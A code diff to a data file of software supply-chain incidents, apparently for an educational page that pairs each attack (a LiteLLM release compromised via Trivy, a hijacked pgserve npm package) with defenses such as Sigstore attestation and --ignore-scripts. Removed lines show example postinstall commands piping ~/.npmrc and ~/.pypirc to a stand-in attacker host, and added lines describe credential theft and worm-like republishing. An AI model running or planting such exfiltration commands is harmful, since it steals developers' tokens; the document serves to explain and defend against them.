@@ -135,12 +135,12 @@ export const incidents: readonly Incident[] = [
     attackName: "TeamPCP / LiteLLM compromise",
     attackDate: "2026-03-24",
     attackOneLine:
-      "credential phish. malicious litellm release lived on PyPI for 40 minutes under the legitimate publisher.",
+      "TeamPCP poisoned Trivy upstream. LiteLLM's CI ran apt-installed Trivy, which exfiltrated PYPI_PUBLISH and pushed 1.82.7 + 1.82.8 for 40 minutes.",
     attackArtifact: [
-      "$ pip install litellm",
-      "  Successfully installed litellm-1.51.4",
-      "  __init__.py: silently exfil OPENAI_API_KEY to dropbox",
-      "  signed with the real maintainer's password",
+      "$ pip install litellm   # 2026-03-24 10:39-11:19 UTC",
+      "  Successfully installed litellm-1.82.8",
+      "  CI's apt-pinned-nothing Trivy stole PYPI_PUBLISH,",
+      "  attacker pushed 1.82.7 + 1.82.8 with a credstealer",
     ],
     defenseName: "Sigstore + trusted publisher (OIDC)",
     defenseOneLine:
@@ -168,23 +168,24 @@ export const incidents: readonly Incident[] = [
     num: "05",
     stageLabel: "DISTRIBUTE",
     question: "the name resolves to bytes somewhere. to whose?",
-    attackName: "pgserve typosquat worm",
+    attackName: "pgserve / CanisterSprawl",
     attackDate: "2026-04-21",
     attackOneLine:
-      "a name close enough to a real PostgreSQL helper. postinstall reaches for npm + pypi tokens.",
+      "the real pgserve, hijacked. postinstall harvested NPM/GH/cloud creds and self-propagated by republishing the maintainer's other packages.",
     attackArtifact: [
-      "$ npm install pgserve   # meant pg-serve",
-      "  postinstall script:",
-      "    cat ~/.npmrc | curl -X POST attacker.tld",
-      "    cat ~/.pypirc | curl -X POST attacker.tld",
+      "$ npm install pgserve   # 2026-04-21 22:14 UTC",
+      "  postinstall harvested NPM/GH/AWS/k8s/SSH creds,",
+      "  exfil to ICP canister cjn37-uyaaa-aaaac-qgnva-cai,",
+      "  republished maintainer's owned packages (worm)",
     ],
-    defenseName: "scoped namespace + registry attestation",
+    defenseName: "registry attestation + --ignore-scripts",
     defenseOneLine:
-      "@org/pgserve ties a name to an owner. registry-served Sigstore attestations let you verify at install time.",
+      "registry-served Sigstore attestations prove bytes came from the expected workflow. --ignore-scripts contains postinstall in CI.",
     defenseArtifact: [
-      "$ npm install @postgres/serve --foreground-scripts=false",
+      "$ npm install pgserve --ignore-scripts",
       "$ npm audit signatures",
-      "  -> all dependencies have valid attestations",
+      "  -> attestation issuer != expected workflow",
+      "  -> install rejected",
     ],
     links: [
       {
